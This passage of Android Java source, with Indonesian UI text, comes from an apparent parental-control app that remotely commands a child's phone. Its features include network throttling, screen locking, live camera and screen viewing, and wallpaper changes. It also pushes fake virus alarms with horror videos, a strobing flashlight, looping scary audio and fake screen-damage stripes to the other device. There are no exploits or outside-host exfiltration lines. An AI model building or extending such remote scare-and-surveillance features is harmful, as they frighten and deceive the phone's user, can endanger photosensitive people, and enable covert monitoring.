        row.addView(del, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));
        showCard(body);
    }

    // ------------------------------------------------------------------ perubahan dari sambungan

    @Override
    public void onLinkChanged() {
        if (link.net && link.state == Link.CONNECTED && link.address.startsWith("net:")) {
            String c = link.address.substring(4);
            for (NetDev n : nets) {
                if (n.code.equals(c) && !n.name.equals(link.name)) {
                    n.name = link.name;
                    saveNets();
                }
            }
        }
        updateHomeStatus();
        renderDevices();
        if (link.state == Link.CONNECTED) {
            setHpStatus((link.net ? "Tersambung lewat internet ke " : "Tersambung ke ") + link.name + ". Tekan namanya untuk membuka fitur.");
        } else if (link.state == Link.IDLE && link.error != null) {
            setHpStatus(link.error);
        }
        if (dialog != null && dialog.isShowing()) {
            if (!deviceListOpen && link.state != Link.CONNECTED) {
                dialog.dismiss();
                toast("Sambungan ke HP anak terputus.");
            } else if (dialogRefresh != null) {
                dialogRefresh.run();
            }
        }
    }

    // ------------------------------------------------------------------ kotak kecil (dialog)

    private LinearLayout card() {
        LinearLayout c = new LinearLayout(this);
        c.setOrientation(LinearLayout.VERTICAL);
        c.setPadding(dp(16), dp(16), dp(16), dp(10));
        c.setBackground(Ui.box(this, Ui.SURFACE, 16, Ui.EDGE, 3f));
        return c;
    }

    /** Sama seperti card(), tapi latar kotaknya transparan (dipakai untuk kotak Device). */
    private LinearLayout cardTransparent() {
        LinearLayout c = new LinearLayout(this);
        c.setOrientation(LinearLayout.VERTICAL);
        c.setPadding(dp(16), dp(16), dp(16), dp(10));
        c.setBackground(Ui.box(this, Color.TRANSPARENT, 16, Ui.EDGE, 3f));
        return c;
    }

    private int dialogWidth() {
        int w = (int) (getResources().getDisplayMetrics().widthPixels * 0.66f);
        return Math.max(dp(232), Math.min(dp(290), w));
    }

    /** Menampilkan kotak kecil. Kalau sudah ada kotak, isinya diganti tanpa berkedip. */
    private void showCard(View body) {
        dialogRefresh = null;
        View brutalBody = Ui.brutal(this, body, 16, 6);
        if (dialog == null || !dialog.isShowing()) {
            final Dialog d = new Dialog(this);
            d.requestWindowFeature(Window.FEATURE_NO_TITLE);
            d.setContentView(brutalBody);
            Window w = d.getWindow();
            if (w != null) {
                w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                w.setDimAmount(0.4f);
            }
            d.setOnDismissListener(x -> {
                if (dialog == d) {
                    dialog = null;
                    dialogBody = null;
                    dialogRefresh = null;
                    closing = false;
                    deviceListOpen = false;
                    if (screen == 1) {
                        screen = 0;
                        deviceList = null;
                        hpStatus = null;
                    }
                }
            });
            d.show();
            if (w != null) {
                w.setLayout(dialogWidth(), WRAP);
            }
            dialog = d;
        } else {
            dialog.setContentView(brutalBody);
            Window w = dialog.getWindow();
            if (w != null) {
                w.setLayout(dialogWidth(), WRAP);
            }
        }
        dialogBody = body;
        body.setAlpha(0f);
        body.setScaleX(0.8f);
        body.setScaleY(0.8f);
        body.animate().alpha(1f).scaleX(1f).scaleY(1f).setDuration(DIALOG_IN_MS)
                .setInterpolator(new DecelerateInterpolator(2f)).start();
    }

    private void dismissDialog() {
        if (dialog != null) {
            Dialog d = dialog;
            dialog = null;
            dialogBody = null;
            dialogRefresh = null;
            closing = false;
            d.dismiss();
        }
    }

    /** Menutup kotak kecil dengan memudar pelan. */
    private void closeDialog() {
        closeDialog(null);
    }

    private void closeDialog(final Runnable after) {
        if (closing) {
            return;
        }
        if (dialog == null || dialogBody == null) {
            dismissDialog();
            if (after != null) {
                after.run();
            }
            return;
        }
        closing = true;
        final Dialog d = dialog;
        dialogRefresh = null;
        dialogBody.animate().alpha(0f).scaleX(0.9f).scaleY(0.9f).setDuration(DIALOG_OUT_MS)
                .withEndAction(new Runnable() {
                    @Override
                    public void run() {
                        closing = false;
                        if (d.isShowing()) {
                            d.dismiss();
                        }
                        if (after != null) {
                            after.run();
                        }
                    }
                }).start();
    }

    private TextView pill(String text, boolean filled) {
        TextView t = Ui.text(this, text, 13, Ui.INK, true, false);
        t.setGravity(Gravity.CENTER);
        t.setLetterSpacing(0.06f);
        t.setPadding(dp(8), dp(10), dp(8), dp(10));
        t.setBackground(Ui.box(this, filled ? Ui.ACCENT : Ui.SURFACE, 12, Ui.INK, 2.5f));
        t.setClickable(true);
        Ui.pressable(t);
        return t;
    }

    private TextView linkText(String text) {
        TextView t = Ui.text(this, text, 12, Ui.SOFT, true, false);
        t.setGravity(Gravity.CENTER);
        t.setPadding(dp(8), dp(9), dp(8), dp(4));
        t.setClickable(true);
        return t;
    }

    private View featureRow(int icon, String title, String sub, View.OnClickListener click) {
        LinearLayout r = new LinearLayout(this);
        r.setGravity(Gravity.CENTER_VERTICAL);
        r.setPadding(dp(10), dp(10), dp(10), dp(10));
        r.setBackground(Ui.box(this, Ui.YELLOW, 12, Ui.EDGE, 2.5f));
        r.setClickable(true);
        r.setOnClickListener(click);
        Ui.pressable(r);

        FrameLayout ico = new FrameLayout(this);
        ico.setBackground(Ui.box(this, Ui.BG, 10, Ui.EDGE, 2f));
        ico.addView(new Ui.IconView(this, icon, Ui.INK), new FrameLayout.LayoutParams(dp(18), dp(18), Gravity.CENTER));
        r.addView(ico, lp(dp(36), dp(36), 0, 0, 10, 0));

        LinearLayout t = new LinearLayout(this);
        t.setOrientation(LinearLayout.VERTICAL);
        t.addView(Ui.text(this, title, 14, Ui.INK, true, false), lp(WRAP, WRAP, 0, 0, 0, 3));
        t.addView(Ui.text(this, sub, 10.5f, Ui.SOFT, false, true), lp(WRAP, WRAP, 0, 0, 0, 0));
        r.addView(t, new LinearLayout.LayoutParams(0, WRAP, 1f));
        return Ui.brutal(this, r, 12, 4);
    }

    /** Kotak kecil berisi daftar HP anak, dibuka dari kartu Device di Quick Actions. */
    private void openDeviceList() {
        if (closing || swapping) {
            return;
        }
        deviceListOpen = true;
        screen = 1;

        LinearLayout body = cardTransparent();
        LinearLayout header = new LinearLayout(this);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.addView(Ui.text(this, "Device", 16, Ui.INK, true, false), new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(header, lp(MATCH, WRAP, 0, 0, 0, 10));

        hpStatus = Ui.text(this, "", 11, Ui.SOFT, false, true);
        hpStatus.setLineSpacing(0, 1.15f);
        body.addView(hpStatus, lp(MATCH, WRAP, 2, 0, 2, 10));

        deviceList = new LinearLayout(this);
        deviceList.setOrientation(LinearLayout.VERTICAL);
        int h = (int) (getResources().getDisplayMetrics().heightPixels * 0.34f);
        Ui.CappedScrollView sv = new Ui.CappedScrollView(this, h);
        sv.setVerticalScrollBarEnabled(false);
        sv.addView(deviceList, new FrameLayout.LayoutParams(MATCH, WRAP));
        body.addView(sv, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView close = linkText("Tutup");
        close.setOnClickListener(v -> closeDialog());
        body.addView(close, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        renderDevices();
    }

    /** Kotak kecil berisi fitur-fitur WA, dibuka dari tombol WA di Home. */
    private void openWa() {
        if (closing || swapping) {
            return;
        }
        LinearLayout body = card();
        body.addView(Ui.text(this, "WA", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout rows = new LinearLayout(this);
        rows.setOrientation(LinearLayout.VERTICAL);
        rows.addView(featureRow(Ui.GRID, "Notif", "Belum aktif", v -> toast("Fitur Notif belum aktif.")), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.GRID, "WA Test", "Belum aktif", v -> toast("Fitur WA Test belum aktif.")), lp(MATCH, WRAP, 0, 0, 0, 0));
        body.addView(rows, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView close = linkText("Tutup");
        close.setOnClickListener(v -> closeDialog());
        body.addView(close, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);
    }

    private void openFeatures() {
        deviceListOpen = false;
        LinearLayout body = cardTransparent();
        TextView title = Ui.text(this, link.name, 16, Ui.INK, true, false);
        title.setSingleLine(true);
        title.setEllipsize(TextUtils.TruncateAt.END);
        body.addView(title, lp(MATCH, WRAP, 0, 0, 0, 4));
        final TextView status = Ui.text(this, "● Tersambung", 10.5f, Ui.GREEN, true, true);
        body.addView(status, lp(WRAP, WRAP, 0, 0, 0, 10));

        // video kecil memanjang ke kiri dan kanan, di atas fitur
        Ui.AspectFrame strip = new Ui.AspectFrame(this, 2.8f);
        strip.setBackgroundColor(0xFF20242C);
        Ui.clipRound(strip, dp(12));
        strip.addView(new LoopVideo(this, "clip.mp4"), new FrameLayout.LayoutParams(MATCH, MATCH));
        body.addView(strip, lp(MATCH, WRAP, 0, 0, 0, 10));

        // daftar fitur bisa discroll supaya kotaknya tidak makin tinggi kalau fiturnya bertambah
        LinearLayout rows = new LinearLayout(this);
        rows.setOrientation(LinearLayout.VERTICAL);
        rows.addView(featureRow(Ui.GRID, "Lock Jaringan", "Bikin jaringan jelek biar gak bisa nonton", v -> openNetLock()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.SCREEN, "Lock Screen", "Kunci layar", v -> openLockScreen()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.WARN, "Prank Virus", "Alarm + video horor", v -> openPrank()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.WARN, "Virus V2", "Video kedua + senter kelap-kelip", v -> openVirus2()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.WARN, "Prank Audio", "Suara menyeramkan", v -> openAudioPrank()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.WARN, "Prank LCD", "Layar jadi garis-garis warna", v -> openLcdPrank()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.CAMERA, "Kamera", "Ambil foto dari HP anak", v -> openCamera()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.SCREEN, "Live Screen", "Lihat layar HP anak", v -> openLiveScreen()), lp(MATCH, WRAP, 0, 0, 0, 8));
        rows.addView(featureRow(Ui.GRID, "Set Wallpaper", "Ganti wallpaper HP anak", v -> openWallpaper()), lp(MATCH, WRAP, 0, 0, 0, 0));
        int rowsMax = (int) (getResources().getDisplayMetrics().heightPixels * 0.34f);
        Ui.CappedScrollView rowsScroll = new Ui.CappedScrollView(this, rowsMax);
        rowsScroll.addView(rows, new FrameLayout.LayoutParams(MATCH, WRAP));
        body.addView(rowsScroll, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView disconnect = linkText("Putuskan");
        disconnect.setOnClickListener(v -> {
            closeDialog();
            link.disconnect();
        });
        body.addView(disconnect, lp(MATCH, WRAP, 0, 4, 0, 0));
        TextView close = linkText("Tutup");
        close.setOnClickListener(v -> closeDialog());
        body.addView(close, lp(MATCH, WRAP, 0, 0, 0, 0));
        showCard(body);

        dialogRefresh = () -> {
            if (link.net && !link.online) {
                status.setText("○ Offline · perintah dikirim saat online");
                status.setTextColor(Ui.SOFT);
            } else {
                status.setText(link.net ? "● Online" : "● Tersambung");
                status.setTextColor(Ui.GREEN);
            }
        };
        dialogRefresh.run();
    }

    private EditText field(String hint, int max) {
        EditText et = new EditText(this);
        et.setSingleLine(true);
        et.setFilters(new InputFilter[]{new InputFilter.LengthFilter(max)});
        et.setHint(hint);
        et.setHintTextColor(Ui.SOFT);
        et.setTextColor(Ui.INK);
        et.setTextSize(13);
        et.setBackground(Ui.box(this, Ui.BG, 14, Ui.EDGE, 1));
        et.setPadding(dp(12), dp(9), dp(12), dp(9));
        return et;
    }

    private void openLockScreen() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Lock Screen", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView stat = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        body.addView(stat, lp(MATCH, WRAP, 0, 0, 0, 10));

        final SharedPreferences sp = getSharedPreferences("lock", MODE_PRIVATE);
        final EditText msg = field("Pesan di layar anak", 120);
        msg.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_CAP_SENTENCES);
        msg.setText(sp.getString("msg", ""));
        body.addView(msg, lp(MATCH, WRAP, 0, 0, 0, 8));
        final EditText pw = field("Password (boleh kosong)", 16);
        pw.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
                | InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
        pw.setText(sp.getString("pw", ""));
        body.addView(pw, lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout row = new LinearLayout(this);
        TextView lock = pill("Lock", true);
        TextView unlock = pill("Unlock", false);
        lock.setOnClickListener(v -> {
            String m = msg.getText().toString().trim();
            String p = pw.getText().toString();
            sp.edit().putString("msg", m).putString("pw", p).apply();
            hideKeyboard(msg);
            // password dikirim sebagai hash, teks aslinya tidak keluar dari HP ini
            link.send("lockScreen", null, m, p.isEmpty() ? "" : Hash.of(p));
        });
        unlock.setOnClickListener(v -> {
            hideKeyboard(msg);
            link.send("unlockScreen", null);
        });
        row.addView(lock, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(unlock, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> {
            hideKeyboard(msg);
            openFeatures();
        });
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);
        if (dialog != null && dialog.getWindow() != null) {
            dialog.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
        }

        dialogRefresh = () -> {
            String base = link.screenLocked ? "Layar anak: terkunci" : "Layar anak: terbuka";
            stat.setText(link.net && !link.online ? base + " (HP anak offline, perintah menunggu)" : base);
            stat.setTextColor(link.screenLocked ? Ui.INK : Ui.SOFT);
        };
        dialogRefresh.run();
        link.send("status", null);
    }

    private void openPrank() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Prank Virus", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 12));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("prank", null);
            toast("Prank dikirim ke HP anak.");
        });
        stop.setOnClickListener(v -> link.send("prankStop", null));
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Prank jalan saat HP anak online lagi."
                : "Di HP anak muncul alarm virus palsu, lalu video horor, lalu tulisan Cuma prank. Berhenti sendiri.");
        dialogRefresh.run();
    }

    private void openVirus2() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Virus V2", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 12));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("virus2", null);
            toast("Virus V2 dikirim ke HP anak.");
        });
        stop.setOnClickListener(v -> link.send("prankStop", null));
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Virus V2 jalan saat HP anak online lagi."
                : "Di HP anak muncul alarm, lalu video horor kedua dengan suara, diulang terus sambil senter berkedip-kedip. Tekan Stop di sini untuk mematikannya. Kalau HP anak tidak punya senter, bagian itu dilewati saja.");
        dialogRefresh.run();
    }

    private void openAudioPrank() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Prank Audio", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 12));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("audio", null);
            toast("Suara dikirim ke HP anak.");
        });
        stop.setOnClickListener(v -> link.send("audioStop", null));
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Suara jalan saat HP anak online lagi."
                : "Di HP anak muncul suara menyeramkan, diulang terus tanpa tampilan apa pun. Tekan Stop di sini untuk mematikannya.");
        dialogRefresh.run();
    }

    private void openLcdPrank() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Prank LCD", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 12));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("prankLcd", null);
            toast("Prank LCD dikirim ke HP anak.");
        });
        stop.setOnClickListener(v -> link.send("prankStop", null));
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Prank LCD jalan saat HP anak online lagi."
                : "Di HP anak muncul layar penuh garis-garis warna (hijau, merah, biru, dll) seperti LCD rusak, diulang terus. Tekan Stop di sini untuk mematikannya.");
        dialogRefresh.run();
    }

    private void openCamera() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Kamera", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 10));

        Ui.AspectFrame photoFrame = new Ui.AspectFrame(this, 1.0f);
        photoFrame.setBackgroundColor(0xFF20242C);
        Ui.clipRound(photoFrame, dp(12));
        final ImageView photo = new ImageView(this);
        photo.setScaleType(ImageView.ScaleType.CENTER_CROP);
        photoFrame.addView(photo, new FrameLayout.LayoutParams(MATCH, MATCH));
        body.addView(photoFrame, lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai Live", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("liveStart", camFacing);
            toast("Live kamera dimulai.");
        });
        stop.setOnClickListener(v -> {
            link.send("liveStop", null);
            toast("Live kamera dihentikan.");
        });
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 8));

        String target = camFacing.equals("back") ? "Depan" : "Belakang";
        TextView swap = pill("Ganti ke Kamera " + target, false);
        swap.setOnClickListener(v -> {
            camFacing = camFacing.equals("back") ? "front" : "back";
            link.send("switchCam", camFacing);
            openCamera(); // gambar ulang supaya label tombol ikut berubah
        });
        body.addView(swap, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        final int[] shownSeq = {-1};
        dialogRefresh = () -> {
            note.setText(link.net && !link.online
                    ? "HP anak offline. Live kamera jalan lagi otomatis saat HP anak online."
                    : "Tekan Mulai Live untuk melihat kamera HP anak kurang-lebih secara real-time (gambar diperbarui terus-menerus). Tekan Stop untuk berhenti. Saat aktif, HP anak menampilkan tanda kamera aktif (titik hijau) di status bar, seperti aplikasi kamera lain.");
            if (link.photoB64 != null && link.photoSeq != shownSeq[0]) {
                shownSeq[0] = link.photoSeq;
                try {
                    byte[] bytes = android.util.Base64.decode(link.photoB64, android.util.Base64.DEFAULT);
                    photo.setImageBitmap(BitmapFactory.decodeByteArray(bytes, 0, bytes.length));
                } catch (Exception ignored) {
                    // foto rusak, diabaikan
                }
            }
        };
        dialogRefresh.run();
    }

    private void openLiveScreen() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Live Screen", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 10));

        Ui.AspectFrame screenFrame = new Ui.AspectFrame(this, 0.56f);
        screenFrame.setBackgroundColor(0xFF20242C);
        Ui.clipRound(screenFrame, dp(12));
        final ImageView screen = new ImageView(this);
        screen.setScaleType(ImageView.ScaleType.FIT_CENTER);
        screenFrame.addView(screen, new FrameLayout.LayoutParams(MATCH, MATCH));
        body.addView(screenFrame, lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout row = new LinearLayout(this);
        TextView start = pill("Mulai Live", true);
        TextView stop = pill("Stop", false);
        start.setOnClickListener(v -> {
            link.send("screenStart", null);
            toast("Live screen dimulai. HP anak akan muncul dialog izin dari Android, harus disetujui di sana dulu.");
        });
        stop.setOnClickListener(v -> {
            link.send("screenStop", null);
            toast("Live screen dihentikan.");
        });
        row.addView(start, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(stop, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        final int[] shownSeq = {-1};
        dialogRefresh = () -> {
            note.setText(link.net && !link.online
                    ? "HP anak offline. Live screen jalan lagi otomatis saat HP anak online."
                    : "Tekan Mulai Live untuk melihat layar HP anak kurang-lebih secara real-time. HP anak akan menampilkan dialog izin resmi dari Android (\"Mulai transmisi atau rekam layar?\") yang harus dipencet manual di sana sekali — ini proteksi bawaan Android, tidak bisa dilewati. Selama aktif, Android juga menampilkan sendiri tanda/notifikasi sedang membagikan layar di HP anak, tidak disembunyikan.");
            if (link.screenB64 != null && link.screenSeq != shownSeq[0]) {
                shownSeq[0] = link.screenSeq;
                try {
                    byte[] bytes = android.util.Base64.decode(link.screenB64, android.util.Base64.DEFAULT);
                    screen.setImageBitmap(BitmapFactory.decodeByteArray(bytes, 0, bytes.length));
                } catch (Exception ignored) {
                    // frame rusak, diabaikan
                }
            }
        };
        dialogRefresh.run();
    }

    private void openWallpaper() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Set Wallpaper", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 10));

        Ui.AspectFrame photoFrame = new Ui.AspectFrame(this, 1.0f);
        photoFrame.setBackgroundColor(0xFF20242C);
        Ui.clipRound(photoFrame, dp(12));
        final ImageView preview = new ImageView(this);
        preview.setScaleType(ImageView.ScaleType.CENTER_CROP);
        if (wallpaperPick != null) {
            preview.setImageBitmap(wallpaperPick);
        }
        photoFrame.addView(preview, new FrameLayout.LayoutParams(MATCH, MATCH));
        body.addView(photoFrame, lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout row = new LinearLayout(this);
        TextView pick = pill("Pilih dari Galeri", false);
        TextView set = pill("Set", true);
        pick.setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.setType("image/*");
            try {
                startActivityForResult(Intent.createChooser(i, "Pilih Foto"), REQ_PICK_WALLPAPER);
            } catch (Exception e) {
                toast("Tidak ada aplikasi galeri.");
            }
        });
        set.setOnClickListener(v -> {
            if (wallpaperPickB64 == null) {
                toast("Pilih foto dari galeri dulu.");
                return;
            }
            link.sendImage("wallpaper", wallpaperPickB64);
            toast("Wallpaper dikirim ke HP anak.");
        });
        row.addView(pick, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(set, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Wallpaper dipasang saat HP anak online lagi."
                : "Pilih foto dari galeri, lalu tekan Set. Wallpaper HP anak otomatis berganti.");
        dialogRefresh.run();
    }

    private void openNetLock() {
        LinearLayout body = card();
        body.addView(Ui.text(this, "Lock Jaringan", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        final TextView note = Ui.text(this, "", 11.5f, Ui.SOFT, false, true);
        note.setLineSpacing(0, 1.15f);
        body.addView(note, lp(MATCH, WRAP, 0, 0, 0, 10));

        LinearLayout row = new LinearLayout(this);
        TextView lock = pill("Kunci", true);
        TextView unlock = pill("Buka", false);
        lock.setOnClickListener(v -> {
            link.send("netLock", null);
            toast("Jaringan HP anak dikunci.");
        });
        unlock.setOnClickListener(v -> {
            link.send("netUnlock", null);
            toast("Jaringan HP anak dibuka lagi.");
        });
        row.addView(lock, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
        row.addView(unlock, new LinearLayout.LayoutParams(0, WRAP, 1f));
        body.addView(row, lp(MATCH, WRAP, 0, 0, 0, 2));

        TextView back = linkText("Kembali");
        back.setOnClickListener(v -> openFeatures());
        body.addView(back, lp(MATCH, WRAP, 0, 4, 0, 0));
        showCard(body);

        dialogRefresh = () -> note.setText(link.net && !link.online
                ? "HP anak offline. Kunci jaringan jalan saat HP anak online lagi."
                : "Internet HP anak dibuat macet terus (gagal memuat, buffering) sampai ditekan Buka, jadi tidak bisa nonton YouTube dkk. Kalau belum pernah dipakai, buka dulu Jaga Anak di HP anak dan izinkan \"Kunci Jaringan (VPN lokal)\" sekali saja (cuma tap Izinkan, bukan ke Pengaturan).");
        dialogRefresh.run();
    }

    // ------------------------------------------------------------------ Generate APK

    private static String genStepLabel(String key) {
        if ("auth".equals(key)) return "Cek token GitHub";
        if ("repo".equals(key)) return "Siapkan repo";
        if ("wf".equals(key)) return "Unggah alur build";
        if ("zip".equals(key)) return "Unggah app.zip";
        if ("run".equals(key)) return "Jalankan build";
        if ("wait".equals(key)) return "Menunggu build selesai";
        if ("done".equals(key)) return "Ambil APK";
        return key;
    }

    private String genLastRunKey;

    private void genLog(String line, boolean replaceLast) {
        if (replaceLast && genLastRunKey != null && !genStatusText.isEmpty()) {
            int idx = genStatusText.lastIndexOf('\n');
            genStatusText = idx >= 0 ? genStatusText.substring(0, idx + 1) + line : line;
        } else {
            genStatusText = genStatusText.isEmpty() ? line : genStatusText + "\n" + line;
        }
        if (genUiRefresh != null) {
            genUiRefresh.run();
        }
    }

    private void genStep(String key, String state, String note) {
        String label = genStepLabel(key);
        boolean sameAsLast = key.equals(genLastRunKey);
        String line;
        if ("run".equals(state)) {
            line = "…  " + label + (note != null && !note.isEmpty() ? " (" + note + ")" : "");
            genLog(line, sameAsLast);
            genLastRunKey = key;
        } else {
            line = ("ok".equals(state) ? "✓  " : "✗  ") + label + (note != null && !note.isEmpty() ? " — " + note : "");
            genLog(line, sameAsLast);
            genLastRunKey = null;
        }
    }

    private void openGenerateApk() {
        if (closing) {
            return;
        }
        LinearLayout body = card();
